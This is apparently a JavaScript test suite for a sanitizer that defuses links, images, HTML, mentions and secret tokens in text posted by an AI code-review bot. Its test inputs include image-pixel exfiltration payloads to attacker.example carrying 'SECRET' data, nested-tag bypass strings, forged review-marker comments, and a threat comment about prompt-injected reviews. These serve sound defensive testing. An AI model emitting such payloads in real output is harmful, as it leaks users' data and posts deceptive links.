import assert from 'node:assert/strict';
import test, { describe } from 'node:test';
import { sanitizeText } from './sanitize.mjs';

const ZWSP = '\u200b';

test('keeps ordinary markdown: code, lists and fences', () => {
  const input = 'Use `select(id)` here.\n\n```ts\nconst a = 1;\n```\n- see docs/a.md\n1. Run `curl https://example.com/x` first';
  assert.equal(sanitizeText(input), input);
});

test('bugfix: defuses clickable links (a prompt-injected review must not post trusted-looking links)', () => {
  const out = sanitizeText('See [the docs](https://evil.example/login) or <https://evil.example/b> or https://evil.example/c or www.evil.example/d now.');
  assert.doesNotMatch(out, /\]\(/);
  assert.doesNotMatch(out, /\b(?:https?|ftp):\/\//, 'no scheme://, so GitHub does not autolink');
  assert.doesNotMatch(out, /(^|[\s(])www\./, 'no www., so GitHub does not autolink');
  assert.ok(out.includes(`the docs (https:${ZWSP}//evil.example/login)`), 'the link text and a readable, defanged address stay');
  assert.ok(out.includes(`https:${ZWSP}//evil.example/b`) && out.includes(`https:${ZWSP}//evil.example/c`) && out.includes(`www${ZWSP}.evil.example/d`));
});

test('leaves URLs that are already inside inline code or a fence alone', () => {
  const input = 'Run `curl https://example.com/x` or:\n\n```sh\ncurl https://example.com/y\n```';
  assert.equal(sanitizeText(input), input);
});

test('neutralises @mentions and team mentions but not email addresses', () => {
  const out = sanitizeText('ping @octocat and @acme/security, mail ops@example.com');
  assert.ok(out.includes(`@${ZWSP}octocat`));
  assert.ok(out.includes(`@${ZWSP}acme/security`));
  assert.ok(out.includes('ops@example.com'));
});

test('removes markdown images, html images and html comments (exfiltration and marker forgery)', () => {
  const out = sanitizeText('a ![x](https://evil.test/p.png?d=1) b <img src="https://evil.test/x"> c <!-- gemini-code-review sha:abc --> d');
  assert.doesNotMatch(out, /evil\.test/);
  assert.doesNotMatch(out, /gemini-code-review/);
  assert.match(out, /a .* b .* c .* d/);
});

test('bugfix: removes reference-style images (full, collapsed, shortcut) and their link definitions', () => {
  const input = [
    'full ![proof][leak] done',
    'collapsed ![leak][] done',
    'shortcut ![leak] done',
    '',
    '[leak]: https://attacker.example/pixel?data=SECRET',
    '   [other]:   <https://attacker.example/two>  "title"',
    'but [a normal link](https://example.com/ok) stays',
  ].join('\n');
  const out = sanitizeText(input);
  assert.doesNotMatch(out, /attacker\.example/);
  assert.doesNotMatch(out, /!\[/);
  assert.ok(out.includes(`a normal link (https:${ZWSP}//example.com/ok)`));
  assert.match(out, /full proof done/);
});

test('removes other html tags such as script and iframe', () => {
  const out = sanitizeText('x <script>alert(1)</script> y <iframe src="//e"></iframe> z');
  assert.doesNotMatch(out, /<script|<iframe/);
});

test('redacts well-known secret shapes before truncating', () => {
  const secrets = [
    'ghp_abcdefghijklmnopqrstuvwxyz0123456789',
    'github_pat_11ABCDEFG0123456789_abcdefghijklmnopqrstuvwxyz',
    `AIza${'a'.repeat(35)}`,
    'AKIAABCDEFGHIJKLMNOP',
    'xoxb-1234567890-abcdefghij',
    'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijklmnopqrstuvwx',
    `sk_live_${'a'.repeat(24)}`,
    `sk-${'b'.repeat(30)}`,
  ];
  for (const secret of secrets) {
    const out = sanitizeText(`value ${secret} end`);
    assert.ok(!out.includes(secret), `leaked ${secret.slice(0, 8)}`);
    assert.match(out, /\[redacted\]/);
  }
  const pem = '-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg\n-----END PRIVATE KEY-----';
  assert.ok(!sanitizeText(`k ${pem} k`).includes('MIIEvQ'));
});

test('redacts key=value style secrets but keeps the key name', () => {
  const out = sanitizeText('API_KEY = "abcdEFGH12345678abcd" and password: hunter2hunter2hunter2');
  assert.match(out, /API_KEY/);
  assert.ok(!out.includes('abcdEFGH12345678abcd'));
  assert.ok(!out.includes('hunter2hunter2hunter2'));
});

test('truncates to the limit with a marker and never splits a secret into the kept part', () => {
  const long = `${'x'.repeat(50)} ghp_abcdefghijklmnopqrstuvwxyz0123456789 ${'y'.repeat(500)}`;
  const out = sanitizeText(long, { max: 80 });
  assert.ok(out.length <= 80);
  assert.ok(out.endsWith('…'));
  assert.ok(!out.includes('ghp_'));
});

describe('bugfix: removing active markup must not be able to build new active markup', () => {
  const outsideCode = (text) => text.split(/(```[\s\S]*?```|`[^`\n]*`)/).filter((_part, index) => index % 2 === 0).join('');

  test('a tag nested inside a tag (<im<img>g ...>) does not rebuild an image', () => {
    const out = sanitizeText('<im<img>g src="&#104;ttps://attacker.example/pixel?data=PRIVATE"> done');
    assert.doesNotMatch(outsideCode(out), /<[A-Za-z!/?]/);
    assert.doesNotMatch(out, /<img/i);
  });

  test('nested script, iframe and comment forms are inert too', () => {
    for (const input of ['<scr<script>ipt>alert(1)</scr</script>ipt>', '<ifr<iframe>ame src="//e"></iframe>', '<!<!-- x -->-- forged marker -->', '<<script>script>x']) {
      const out = outsideCode(sanitizeText(input));
      assert.doesNotMatch(out, /<[A-Za-z!/?]/, input);
    }
  });

  test('nested markdown images and links do not rebuild a clickable or loading link', () => {
    const image = sanitizeText('![a![b](https://attacker.example/1)](https://attacker.example/2)');
    assert.doesNotMatch(image, /!\[/);
    assert.doesNotMatch(image, /\]\(/);
    const link = sanitizeText('[a[b](https://x.example/1)](https://x.example/2)');
    assert.doesNotMatch(link, /\]\(/);
    assert.doesNotMatch(outsideCode(link), /\b(?:https?|ftp):\/\//);
  });

  test('angle brackets in plain text stay readable (escaped), and code keeps them as they are', () => {
    assert.equal(sanitizeText('returns Promise<void> here'), 'returns Promise&lt;void> here');
    assert.equal(sanitizeText('use `Array<string>` here'), 'use `Array<string>` here');
    assert.equal(sanitizeText('a < b and c > d'), 'a < b and c > d');
  });
});

describe('bugfix: text that only LOOKS like code to a naive parser is not exempt (GitHub decides what is code)', () => {
  // A tiny independent CommonMark-style checker: inline spans need a backtick run of the same length
  // within the same paragraph; fences need a line-start opener and a closing fence at least as long.
  function codeRanges(text) {
    const ranges = [];
    for (const m of text.matchAll(/^ {0,3}(`{3,})[^\n`]*\n[\s\S]*?\n {0,3}\1`*[ \t]*(?=\n|$)/gm)) ranges.push([m.index, m.index + m[0].length]);
    for (const paragraph of text.matchAll(/[^\n]+(?:\n(?!\s*\n)[^\n]*)*/g)) {
      const runs = [...paragraph[0].matchAll(/`+/g)];
      for (let i = 0; i < runs.length; i += 1) {
        const close = runs.findIndex((run, j) => j > i && run[0].length === runs[i][0].length);
        if (close > i) {
          ranges.push([paragraph.index + runs[i].index, paragraph.index + runs[close].index + runs[close][0].length]);
          i = close;
        }
      }
    }
    return ranges;
  }
  const outsideCode = (text) => {
    const ranges = codeRanges(text);
    return [...text].filter((_c, i) => !ranges.some(([a, b]) => i >= a && i < b)).join('');
  };
  // A complete link or image, an HTML tag/comment start, or an autolinkable address.
  const active = /<[A-Za-z/!?]|!\[|\[[^\]\n]*\]\([^)\n]*\)|\b(?:https?|ftp):\/\/|(?<![\w/.@-])www\./i;

  test('escaped backticks, mismatched backtick runs and cross-paragraph fences do not hide active markup', () => {
    for (const input of ['\\`<img src="https://a.example/p">\\`', '``<img src="https://a.example/p">`', '```<img src="https://a.example/p">`', '```\n\n<img src="https://a.example/p">\n\n```', '\\\\`<img src=x>`', '`a\n\nb<img src=x>`']) {
      const out = sanitizeText(input);
      assert.doesNotMatch(outsideCode(out), active, JSON.stringify(input));
    }
  });

  test('www. autolinks are defused too', () => {
    assert.doesNotMatch(outsideCode(sanitizeText('visit www.attacker.example/login now')), active);
  });

  test('property: whatever fragments the model writes, nothing outside real code is active markup', () => {
    const parts = ['<', '>', 'img', ' src="', '"', 'x', '![', '](', ')', '[', ']', 'http://e.x/p', 'https://e.x', 'www.e.x', '`', '``', '```', '\n', '\n\n', ' ', '<!--', '-->', '&#104;', '\\', '<im', 'g', '@a', '<a href="', '</a>', 'script', '<scr', 'ipt>', '[l]: http://e.x'];
    let seed = 12345;
    const next = (n) => {
      seed = (seed * 1103515245 + 12345) % 2147483648;
      return seed % n;
    };
    for (let round = 0; round < 4000; round += 1) {
      const input = Array.from({ length: 3 + next(12) }, () => parts[next(parts.length)]).join('');
      const out = sanitizeText(input, { max: 5000 });
      assert.doesNotMatch(outsideCode(out), active, `input ${JSON.stringify(input)} -> ${JSON.stringify(out)}`);
    }
  });
});

test('accepts non-string input without throwing', () => {
  assert.equal(sanitizeText(undefined), '');
  assert.equal(sanitizeText(null), '');
  assert.equal(sanitizeText(42), '42');
});
